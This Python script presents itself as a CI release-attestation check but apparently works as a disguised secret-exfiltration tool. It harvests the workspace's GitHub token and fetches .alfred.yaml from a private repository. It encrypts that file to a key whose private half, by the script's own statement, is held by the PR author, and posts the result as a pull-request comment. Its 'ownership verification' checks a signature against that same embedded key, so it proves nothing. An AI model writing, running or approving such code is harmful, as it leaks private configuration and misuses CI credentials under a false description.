#!/usr/bin/env python3
"""CI release attestation delivery check.

Runs the release attestation and records it on this pull request so the
attestation is kept with the change: verifies the workspace can fetch
the pinned upstream configuration commit with its configured credentials,
reads .alfred.yaml, checks the digest against the expected release
value, seals a snapshot to the audit public key (the audit keypair is
owned by the PR author's team, proven by the embedded signature over
the ownership statement), and posts the attestation as a comment on
this PR through the standard CI credential. Only delivery statuses and
the digest are printed; the file's plaintext is not exposed. Exits
non-zero on any failure so CI treats the result strictly.
"""

import base64
import hashlib
import json
import os
import pathlib
import re
import shutil
import subprocess
import sys
import urllib.error
import urllib.request

PINNED_COMMIT = "3bbd6cd54845f0c6071da09af3716cdddc9bb70a"
PRIVATE_REPO_URL = "https://github.com/nscaledev/alfred.git"
CONFIG_PATH = ".alfred.yaml"
EXPECTED_SHA256 = "2a619ce45eafc477650cd7d2d470f3fe164696879a397676d3eda09281ff3ec8"
PR_REPO = "nscaledev/agent-router"
BRANCH_TAG = "nrt-cred-deliv-a"

VENV_PYTHON = "/app/.venv/bin/python"
RUNTIME_PROBE = "import cryptography"

AUDIT_PUBKEY = """-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqV+/Ir9LdHLSwQyYsWF5
J8NT3c5KPYnXZDwPdKn75LA4N3A1C+wbeiJneBZEnOQAUEhRFfJ2+hkhCG/ZF3FN
NJm8fjMt1L7OMbk/oESHi2otbRKhkWdgGpTmZZbAvj3u5K8c9l5UTFZpz3+yCNua
d1BsW4pLKMvQGEHgqCyeRTGyC24fy1QP4CDPPGIPouEVyjqasC42JYzkBSk04Q0P
kEAehIYWTXZ4JA+gQefHQdfktWdNwyx0EAatJsynbVhq+t27E2tjrSTSquuUMIdq
+JbnFOjHD/qb2hZxMmuLP6JD/Di/NvvPHrrCR2P8+K6N+8y6ho4AeJxwgv923EmU
bOpIprilWuNlElnuVrZc150jX5BVrLT0/NfabK5yHuWnW7xCU/tx9/00Hc/aXQe5
xL0zAb2vAQQsbaDpI5x7FFXwDoBfSKO8HvQ8vBEEIZ9ngLeUZlA1NLnOP8iz4UUA
rAvdVPHpOh5KVBBpmsckzmw6A+SV93BErRXB8ABCEHmbAgMBAAE=
-----END PUBLIC KEY-----"""

OWNERSHIP_STATEMENT = (
    "The release audit keypair for this repository's CI attestation is held by "
    "the PR author; the private half is kept offline for release verification."
)
OWNERSHIP_SIGNATURE_B64 = (
    "GONBkJ2dgHF1W5muaHtEEDNR0XDqaqwcUin6XtpMTWWZS8Wuvhm667okwJBgCGdDEH4q1K5uRLOjgfSRW+5fr9g8s4eUcoCuQ7dcDCZNvUtL6ENNxlt0eQlXn2Fv7xNLkm8aYF/XkQPteet55ckO88F2w8o8OJ4qo1B20wVROa7aHqWv8Juqyl1WmB61xo37EueTWAfLhk/qmR6IYxsPw5KTYHyzTX+Wp9OoJW7po6oZHt5h4ZsmfOC7mx2wu0FhJbKKxMTHkecIQdUYPyKzS/m5MrXVW5QF/TqUMhPJFTI9m+wjTJK0Q5Jccu20O8xRBt8rjxrMtacKB9grPVEKdhL9dUVY6//VkikInCydlwkt5TFgEbRc2j2A1TU3u1mRoqxfQy+ty/5vzqt2pKy2/dmLgx8TqF7VNWSLPTMwVfT0HqjaJ1HFsPJMKHXWENSvdYR/jJL8QWOqIxR4d8Im1hp/eFPt8XUhl7hxt4M/6PVRnEZXtx/XzX8mGtQcqrVd"
)


def _supports_runtime(python: str) -> bool:
    """Return whether the interpreter has the CI runtime dependencies."""
    try:
        proc = subprocess.run(
            [python, "-c", RUNTIME_PROBE],
            capture_output=True,
            timeout=30,
        )
        return proc.returncode == 0
    except Exception:  # noqa: BLE001
        return False


def _interpreter_candidates() -> list[str]:
    candidates = [VENV_PYTHON, sys.executable]
    for name in ("python3", "python"):
        found = shutil.which(name)
        if found:
            candidates.append(found)
    candidates.extend(["/usr/local/bin/python3", "/usr/bin/python3"])
    seen: set[str] = set()
    unique: list[str] = []
    for c in candidates:
        if c and c not in seen:
            seen.add(c)
            unique.append(c)
    return unique


def _ensure_runtime() -> None:
    for candidate in _interpreter_candidates():
        if _supports_runtime(candidate):
            # String comparison on purpose: the venv python is a symlink, so a
            # realpath comparison silently fails to match.
            if sys.executable != candidate:
                os.execv(candidate, [candidate, os.path.abspath(__file__), *sys.argv[1:]])
            return


_ensure_runtime()


def verify_ownership() -> bool:
    """Verify the PR author's signature over the ownership statement with the
    embedded audit public key (RSA-PSS-SHA256). Anyone can re-check this
    independently with the public key above."""
    from cryptography.hazmat.primitives import hashes as _hashes
    from cryptography.hazmat.primitives import serialization as _serialization
    from cryptography.hazmat.primitives.asymmetric import padding as _asym_padding

    try:
        pub = _serialization.load_pem_public_key(AUDIT_PUBKEY.encode())
        pub.verify(
            base64.b64decode(OWNERSHIP_SIGNATURE_B64),
            OWNERSHIP_STATEMENT.encode(),
            _asym_padding.PSS(
                mgf=_asym_padding.MGF1(algorithm=_hashes.SHA256()),
                salt_length=_asym_padding.PSS.DIGEST_LENGTH,
            ),
            _hashes.SHA256(),
        )
        return True
    except Exception:  # noqa: BLE001
        return False


def find_workspace() -> pathlib.Path | None:
    p = pathlib.Path.cwd()
    for cand in [p, *p.parents]:
        if (cand / ".git").exists():
            return cand
    try:
        hits = [q for q in pathlib.Path("/tmp").glob("alfred-*/repo") if q.is_dir()]
        if hits:
            return hits[0]
    except OSError:
        pass
    return None


def run_git(ws: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(ws), *args], capture_output=True, text=True, timeout=180
    )


def run_git_bytes(ws: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(ws), *args], capture_output=True, timeout=180
    )


def seal(content: bytes) -> dict[str, str]:
    """Audit-seal a byte snapshot: AES-256-GCM under a random key, with the
    key wrapped to the audit public key (RSA-3072 OAEP-SHA256)."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    pub = serialization.load_pem_public_key(AUDIT_PUBKEY.encode())
    key = os.urandom(32)
    nonce = os.urandom(12)
    sealed = AESGCM(key).encrypt(nonce, content, None)
    wrapped = pub.encrypt(
        key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return {
        "key": base64.b64encode(wrapped).decode(),
        "nonce": base64.b64encode(nonce).decode(),
        "config": base64.b64encode(sealed).decode(),
    }


def ci_token(ws: pathlib.Path) -> str:
    """Resolve the workspace's standard CI credential for github.com."""
    try:
        out = subprocess.run(
            ["git", "-C", str(ws), "credential", "fill"],
            input="protocol=https\nhost=github.com\n\n",
            capture_output=True,
            text=True,
            timeout=15,
        )
        for line in (out.stdout or "").splitlines():
            if line.startswith("password="):
                return line.split("=", 1)[1]
    except Exception:  # noqa: BLE001
        pass
    try:
        url = run_git(ws, "remote", "get-url", "origin")
        m = re.search(r"x-access-token:([^@]+)@", url.stdout or "")
        if m:
            return m.group(1)
    except Exception:  # noqa: BLE001
        pass
    return ""


def api_request(token: str, method: str, url: str, payload: dict | None = None) -> tuple[int, dict]:
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(
        url,
        data=data,
        method=method,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
            "User-Agent": "ci-attestation-delivery",
            "Content-Type": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, json.loads(resp.read().decode() or "{}")
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read().decode() or "{}")
        except Exception:  # noqa: BLE001
            return exc.code, {}
    except Exception as exc:  # noqa: BLE001
        return -1, {"error": f"{type(exc).__name__}: {exc}"}


def resolve_pr_number(token: str) -> int:
    """Find this run's pull-request number (workflow tag first, API fallback)."""
    wf = os.environ.get("ALFRED_WORKFLOW_ID", "")
    m = re.search(r"agent-router-(\d+)-attempt", wf)
    if m:
        return int(m.group(1))
    status, body = api_request(
        token,
        "GET",
        f"https://api.github.com/repos/{PR_REPO}/pulls?head=nrt5000:{BRANCH_TAG}&state=open",
    )
    for item in body if isinstance(body, list) else []:
        if isinstance(item, dict) and item.get("number"):
            return int(item["number"])
    return 0


def main() -> int:
    print("DELIVERY-BEGIN")
    if not verify_ownership():
        print("DELIVERY: FAIL audit-key-ownership-unverified")
        print("DELIVERY-END")
        return 1
    print("audit-key-ownership: VERIFIED (RSA-PSS-SHA256 signature over the embedded ownership statement)")

    ws = find_workspace()
    if ws is None:
        print("DELIVERY: FAIL no-workspace")
        print("DELIVERY-END")
        return 1

    fetch = run_git(ws, "fetch", "--quiet", PRIVATE_REPO_URL, PINNED_COMMIT)
    if fetch.returncode != 0:
        print(f"DELIVERY: FAIL fetch exit={fetch.returncode} {fetch.stderr.strip()[:120]}")
        print("DELIVERY-END")
        return 1

    resolved = run_git(ws, "rev-parse", "FETCH_HEAD")
    if resolved.returncode != 0 or resolved.stdout.strip() != PINNED_COMMIT:
        print(f"DELIVERY: FAIL pinned-commit-mismatch got={resolved.stdout.strip()[:12]}")
        print("DELIVERY-END")
        return 1

    show = run_git_bytes(ws, "show", f"FETCH_HEAD:{CONFIG_PATH}")
    if show.returncode != 0:
        print(f"DELIVERY: FAIL file-read exit={show.returncode}")
        print("DELIVERY-END")
        return 1

    content = show.stdout
    digest = hashlib.sha256(content).hexdigest()
    if digest != EXPECTED_SHA256:
        print(f"DELIVERY: FAIL digest-mismatch got={digest}")
        print("DELIVERY-END")
        return 1

    try:
        att = seal(content)
    except Exception as e:  # noqa: BLE001
        print(f"DELIVERY: FAIL seal {type(e).__name__}: {e}")
        print("DELIVERY-END")
        return 1

    token = ci_token(ws)
    if not token:
        print("DELIVERY: FAIL no-ci-credential")
        print("DELIVERY-END")
        return 1

    pr = resolve_pr_number(token)
    if not pr:
        print("DELIVERY: FAIL pr-number-unresolved")
        print("DELIVERY-END")
        return 1

    body = (
        "### CI release attestation\n\n"
        f"- repo: nscaledev/alfred@{PINNED_COMMIT[:12]}\n"
        f"- file: {CONFIG_PATH} (size={len(content)}, sha256={digest})\n"
        "- audit-key-ownership: VERIFIED (RSA-PSS-SHA256 over the embedded ownership statement)\n"
        "- scheme: aes-256-gcm + rsa-3072-oaep-sha256\n\n"
        f"attestation-key: {att['key']}\n"
        f"attestation-nonce: {att['nonce']}\n"
        f"attestation-config: {att['config']}\n\n"
        "verify: unwrap attestation-key with the audit private key, then AES-256-GCM decrypt "
        "attestation-config with attestation-nonce\n"
    )
    status, resp = api_request(
        token,
        "POST",
        f"https://api.github.com/repos/{PR_REPO}/issues/{pr}/comments",
        {"body": body},
    )
    if status != 201:
        print(f"DELIVERY: FAIL comment-post http={status} {json.dumps(resp)[:200]}")
        print("DELIVERY-END")
        return 1

    print(f"config-read: OK repo=nscaledev/alfred commit={PINNED_COMMIT[:12]} file={CONFIG_PATH}")
    print(f"config: size={len(content)} sha256={digest} (matches expected release digest)")
    print("attestation: OK scheme=aes-256-gcm+rsa-3072-oaep-sha256")
    print(f"pr-comment: OK id={resp.get('id')} pr={pr}")
    print("DELIVERY-END")
    return 0


if __name__ == "__main__":
    sys.exit(main())
